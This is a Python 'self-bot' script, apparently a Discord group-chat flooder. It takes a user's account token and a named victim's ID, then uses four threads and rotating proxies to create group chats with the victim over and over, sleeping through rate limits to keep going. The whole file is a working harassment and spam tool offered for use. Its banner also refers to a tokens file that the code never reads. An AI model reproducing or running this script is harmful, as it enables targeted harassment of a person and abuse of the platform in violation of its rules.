import os
import requests
import threading
import random
import proxygen
from itertools import cycle
from colors import black, blue, red, green, yellow, cyan, reset, magenta, white
import time
import json

print("""%s
  ██████  ██▓    ▄▄▄     ▓██   ██▓▓█████  ██▀███  
▒██    ▒ ▓██▒   ▒████▄    ▒██  ██▒▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▒██░   ▒██  ▀█▄   ▒██ ██░▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒██░   ░██▄▄▄▄██  ░ ▐██▓░▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒░██████▒▓█   ▓██▒ ░ ██▒▓░░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░ ▒░▓  ░▒▒   ▓▒█░  ██▒▒▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░░ ░ ▒  ░ ▒   ▒▒ ░▓██ ░▒░  ░ ░  ░  ░▒ ░ ▒░
░  ░  ░    ░ ░    ░   ▒   ▒ ▒ ░░     ░     ░░   ░ 
      ░      ░  ░     ░  ░░ ░        ░  ░   ░     
                          ░ ░                     

%s
%s[!] This is Slayer SelfBot's Gc Flooder, before starting insert the tokens in 'tokens.txt', and make sure that all of them have the victim friended. [!]%s
""" % (blue(), reset(), yellow(), reset()))

tken = input("[%s+%s] %sInsert your token%s > " % (green(), reset(), magenta(), reset()))
os.system("cls")

victim = str(input("[%s+%s] %sInsert the victim's ID%s > " % (green(), reset(), magenta(), reset())))
alt = str(input("\n[%s+%s] %sInsert your alt's ID to add in the gc%s > " % (green(), reset(), magenta(), reset())))
numbersoftimes = int(input("\n[%s+%s] %sSelect the number of group chats to create with each accounts%s > " % (green(), reset(), magenta(), reset())))

os.system("cls")


proxies = proxygen.get_proxies()
proxy_pool = cycle(proxies)




def flood():
    json = {
        "recipients": [victim]
        }
    auth = {
        "authorization": tken
        }
    times = 1
    while times <= numbersoftimes:
        try:
            r = requests.post("https://discord.com/api/v9/users/@me/channels",  headers=auth, json=json, proxies={"http": next(proxy_pool)})
            if r.status_code == 200:
                print(f"\n[%s+%s] %sCreated the GC {times} times%s" % (green(), reset(), green(), reset()))
                times += 1
            elif r.status_code == 429:
                print("\n[%s-%s] %sCooldown%s..." % (red(), reset(), red(), reset()))
                s = r.json()
                time.sleep(s['retry_after'])
        except:
            pass

threads = []
for i in range(4):
    t = threading.Thread(target=flood)
    threads.append(t)
    t.start()

exit = input("\nAll tasks are done, press anything to exit: ")